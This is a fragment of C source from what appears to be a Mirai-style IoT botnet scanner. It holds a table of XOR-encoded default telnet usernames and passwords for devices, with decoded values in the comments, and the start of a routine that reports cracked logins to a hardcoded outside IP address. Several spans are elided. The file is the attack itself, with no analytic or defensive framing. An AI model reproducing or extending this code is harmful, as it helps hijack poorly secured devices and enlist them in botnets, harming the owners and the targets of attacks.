...
void scanner_init(void)
{
    ...
    // 0x1337c0d3
    add_auth_entry("\x53\x52\x51\x56\x42\x5B\x43", "\x78\x4F\x5F\x5B\x40\x64\x70\x0F", 15); // default:OxhlwSG8
    add_auth_entry("\x53\x52\x51\x56\x42\x5B\x43", "\x43\x5B\x7D\x40\x47\x55\x58\x01", 15); // default:tlJwpbo6
    add_auth_entry("\x53\x52\x51\x56\x42\x5B\x43", "\x64\x05\x51\x70\x46\x79\x71\x44", 15); // default:S2fGqNFs
    ...
    add_auth_entry("\x50\x42\x52\x44\x43", "\x06\x05\x04\x03\x02", 10); // guest:12345
    add_auth_entry("\x50\x42\x52\x44\x43", "", 5); // guest:
    add_auth_entry("\x56\x53\x5A\x5E\x59", "", 5); // admin:
    add_auth_entry("\x44\x42\x47\x47\x58\x45\x43", "\x44\x42\x47\x47\x58\x45\x43", 14); // support:support
    add_auth_entry("\x56\x53\x5A\x5E\x59", "\x03\x04\x05\x06", 9); // admin:4321
    ...
    add_auth_entry("\x45\x58\x58\x43", "\x43\x07\x43\x56\x5B\x54\x07\x59\x43\x45\x07\x5B\x03\x16", 18); // root:t0talc0ntr0l4!
    add_auth_entry("\x55\x5E\x59", "", 3); // bin:
    add_auth_entry("\x56\x53\x5A", "", 3); // adm:
    add_auth_entry("\x53\x52\x51\x56\x42\x5B\x43", "", 7); // default:
    add_auth_entry("\x56\x53\x5A\x5E\x59", "\x44\x4E\x59\x59\x52\x43", 11); // admin:synnet
    ...
    add_auth_entry("\x45\x58\x58\x43", "\x4D\x5B\x4F\x4F\x19\x37", 10); // root:zlxx.
    add_auth_entry("\x45\x58\x58\x43", "\x43\x56\x6D\x4D\x77\x05\x04\x03\x0E\x02\x0F\x02\x0E", 17); // root:taZz@23495859
    ...
    add_auth_entry("\x56\x53\x5A\x5E\x59", "\x4D\x43\x52\x02\x06\x07,", 11); // admin:zte510
...
static void report_working(ipv4_t daddr, uint16_t dport, struct scanner_auth *auth)
{
    ...
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INET_ADDR(206,189,154,224);
